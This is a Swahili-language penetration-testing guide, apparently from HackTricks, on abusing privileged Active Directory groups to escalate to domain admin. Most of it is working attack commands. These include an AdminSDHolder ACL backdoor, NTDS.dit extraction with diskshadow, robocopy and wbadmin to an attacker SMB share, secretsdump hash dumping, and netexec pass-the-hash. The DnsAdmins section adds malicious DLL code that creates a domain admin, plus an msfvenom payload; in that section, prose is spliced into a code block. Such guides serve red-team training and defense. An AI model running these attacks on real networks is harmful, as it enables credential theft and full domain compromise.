# Makundi Yenye Vibali

{{#include ../../banners/hacktricks-training.md}}

## Makundi Yanayojulikana Yenye Vibali vya Usimamizi

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Kikundi hiki kimepewa uwezo wa kuunda akaunti na makundi ambayo si administrators kwenye domain. Zaidi ya hayo, kinaruhusu kuingia kwa ndani (local login) kwenye Domain Controller (DC).

Ili kubaini wanachama wa kikundi hiki, amri ifuatayo inatekelezwa:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Inaruhusiwa kuongeza watumiaji wapya, pamoja na kuingia kwa ndani kwenye DC.

## Kikundi cha AdminSDHolder

Orodha ya Udhibiti wa Ufikiaji (ACL) ya kikundi cha **AdminSDHolder** ni muhimu kwani inaweka ruhusa kwa makundi yote yaliyolindwa ndani ya Active Directory, ikiwa ni pamoja na makundi yenye vibali vya juu. Mekanismu hii inahakikisha usalama wa makundi haya kwa kuzuia mabadiliko yasiyoruhusiwa.

Mshambuliaji anaweza kuitumia hili kwa kubadilisha ACL ya kikundi cha **AdminSDHolder**, na kumpa mtumiaji wa kawaida ruhusa kamili. Hii ingempa mtumiaji huyo udhibiti kamili juu ya makundi yote yaliyolindwa. Iwapo ruhusa za mtumiaji huyo zitabadilishwa au kuondolewa, zitarejeshwa kiotomatiki ndani ya saa moja kutokana na muundo wa mfumo.

Amri za kukagua wanachama na kubadilisha ruhusa ni pamoja na:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Skripti inapatikana ili kuharakisha mchakato wa urejesho: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Kwa maelezo zaidi, tembelea [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Uanachama katika kikundi hiki unaruhusu kusoma vitu vilivyofutwa vya Active Directory, ambavyo vinaweza kufichua taarifa nyeti:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Ufikiaji wa Domain Controller

Ufikiaji wa faili kwenye DC umewekewa vikwazo isipokuwa mtumiaji ni sehemu ya kikundi cha `Server Operators`, ambalo hubadilisha kiwango cha ufikiaji.

### Kupandisha Vibali

Kwa kutumia `PsService` au `sc` kutoka Sysinternals, mtu anaweza kukagua na kubadilisha ruhusa za huduma. Kwa mfano, kikundi cha `Server Operators` kina udhibiti kamili juu ya huduma fulani, kuruhusu utekelezaji wa amri zozote na kupandisha vibali:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Amri hii inaonyesha kwamba `Server Operators` wana ufikiaji kamili, kuruhusu kusimamia huduma za mfumo ili kupata vibali vilivyoongezwa.

## Backup Operators

Uanachama kwenye kikundi cha `Backup Operators` hutoa ufikiaji kwa mfumo wa faili wa `DC01` kutokana na vibali vya `SeBackup` na `SeRestore`. Vibali hivi vinaruhusu kutembea ndani ya folda, kuorodhesha, na kunakili faili, hata bila ruhusa za wazi, kwa kutumia bendera ya `FILE_FLAG_BACKUP_SEMANTICS`. Ni muhimu kutumia scripts maalum kwa mchakato huu.

Ili kuorodhesha wanachama wa kikundi, tekeleza:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Shambulio la Lokali

Ili kutumia vibali hivi kwa lokali, hatua zifuatazo zinafanywa:

1. Ingiza maktaba zinazohitajika:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Washa na uhakikishe `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Kufikia na kunakili faili kutoka kwa saraka zilizozuiliwa, kwa mfano:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Shambulio la AD

Upatikanaji wa moja kwa moja kwenye mfumo wa faili wa Domain Controller unaruhusu uibiwa wa hifadhidata ya `NTDS.dit`, ambayo ina NTLM hashes zote za watumiaji na kompyuta za domain.

#### Kutumia diskshadow.exe

1. Unda shadow copy ya drive `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Nakili `NTDS.dit` kutoka kwenye shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Badala yake, tumia `robocopy` kwa kunakili faili:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Toa `SYSTEM` na `SAM` kwa ajili ya kupata hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Pata hash zote kutoka kwa `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Baada ya uchimbaji: Pass-the-Hash kwa DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Kutumia wbadmin.exe

1. Sanidi mfumo wa faili NTFS kwa SMB server kwenye mashine ya mshambuliaji na uhifadhi (cache) nywila za SMB kwenye mashine lengwa.
2. Tumia `wbadmin.exe` kwa ajili ya chelezo ya mfumo na uchimbaji wa `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Wanachama wa kundi la **DnsAdmins** wanaweza kutumia vibali vyao kupakia DLL yoyote yenye vibali vya SYSTEM kwenye DNS server, mara nyingi iliyoendesha kwenye Domain Controllers. Uwezo huu unaruhusu matumizi mabaya yenye athari kubwa.

Ili kuorodhesha wanachama wa kundi la DnsAdmins, tumia:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Endesha DLL yoyote (CVE‑2021‑40469)

> [!NOTE]
> Hitilafu hii inaruhusu utekelezaji wa msimbo wowote kwa vibali vya SYSTEM katika huduma ya DNS (kawaida ndani ya DCs). Tatizo hili lilirekebishwa mwaka 2021.

Wanachama wanaweza kufanya server ya DNS kupakia DLL yoyote (kwa ndani au kutoka kwa share ya mbali) kwa kutumia amri kama:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Kuanza upya huduma ya DNS (ambayo inaweza kuhitaji ruhusa za ziada) inahitajika ili DLL ipakwe:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Kwa maelezo zaidi kuhusu vektori hii ya shambulio, rejea ired.team.

#### Mimilib.dll

Inawezekana pia kutumia mimilib.dll kwa utekelezaji wa amri, ukibadilisha ili kutekeleza amri maalum au reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) kwa maelezo zaidi.

### WPAD Rekodi kwa MitM

DnsAdmins wanaweza kuathiri rekodi za DNS ili kufanya shambulio za Man-in-the-Middle (MitM) kwa kuunda rekodi ya WPAD baada ya kuzima global query block list. Zana kama Responder au Inveigh zinaweza kutumika kwa spoofing na kukamata trafiki ya mtandao.

### Wasomaji wa logi za matukio

Wanachama wanaweza kufikia logi za matukio, kwa uwezekano kupata taarifa nyeti kama nywila za maandishi wazi (plaintext) au maelezo ya utekelezaji wa amri:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Kikundi hiki kinaweza kubadilisha DACLs kwenye domain object, na hivyo kuweza kutoa ruhusa za DCSync. Mbinu za privilege escalation zinazotumia kikundi hiki zimetajwa kwa undani kwenye Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators

Hyper-V Administrators wana upatikanaji kamili wa Hyper-V, ambao unaweza kutumika kupata udhibiti wa Domain Controllers zilizovirtualishwa. Hii inajumuisha cloning ya live DCs na kutoa NTLM hashes kutoka kwa faili NTDS.dit.

### Exploitation Example

Firefox's Mozilla Maintenance Service inaweza kutumika na Hyper-V Administrators kutekeleza amri kama SYSTEM. Hii inahusisha kuunda hard link kwa faili ya SYSTEM iliyo na ulinzi na kuibadilisha kwa executable hatarishi:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Note: Hard link exploitation imepunguzwa katika masasisho ya hivi karibuni ya Windows.

## Group Policy Creators Owners

Kikundi hiki kinawawezesha wanachama kuunda Group Policies katika domain. Hata hivyo, wanachama wake hawawezi apply group policies kwa watumiaji au vikundi au kuhariri GPOs zilizopo.

## Organization Management

Katika mazingira ambapo **Microsoft Exchange** imewekwa, kikundi maalum kinachojulikana kama **Organization Management** kina uwezo mkubwa. Kikundi hiki kina haki ya **access the mailboxes of all domain users** na kinahifadhi **full control over the 'Microsoft Exchange Security Groups'** Organizational Unit (OU). Udhibiti huu unajumuisha kikundi cha **`Exchange Windows Permissions`**, ambacho kinaweza kutumika kwa privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Wanachama wa **Print Operators** wamepewa haki kadhaa, ikiwemo **`SeLoadDriverPrivilege`**, ambayo inawawezesha **log on locally to a Domain Controller**, kuizima, na kusimamia printers. Ili kutekeleza misingi ya haki hizi, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani chini ya muktadha usio na elevation, ni lazima kupitisha User Account Control (UAC).

Ili kuorodhesha wanachama wa kikundi hiki, amri ya PowerShell ifuatayo inatumika:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Kwa mbinu za kina za exploitation zinazohusiana na **`SeLoadDriverPrivilege`**, tafuta rasilimali maalum za usalama.

#### Watumiaji wa Remote Desktop

Wanachama wa kikundi hiki wanapewa upatikanaji wa PC kupitia Remote Desktop Protocol (RDP). Ili kuorodhesha wanachama hawa, amri za PowerShell zinapatikana:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Maelezo zaidi kuhusu exploiting RDP yanaweza kupatikana katika rasilimali maalum za pentesting.

#### Watumiaji wa Usimamizi wa Mbali

Wanachama wanaweza kufikia PC kupitia **Windows Remote Management (WinRM)**. Uorodheshaji wa wanachama hawa unafanywa kupitia:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Kwa exploitation techniques zinazohusiana na **WinRM**, inashauriwa kushauriana na nyaraka maalum.

#### Server Operators

Kikundi hiki kina ruhusa za kufanya usanidi mbalimbali kwenye Domain Controllers, ikiwa ni pamoja na ruhusa za kuhifadhi nakala na kurejesha (backup/restore), kubadilisha saa ya mfumo, na kuzima mfumo. Ili kuorodhesha wanachama, amri iliyotolewa ni:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Marejeo <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
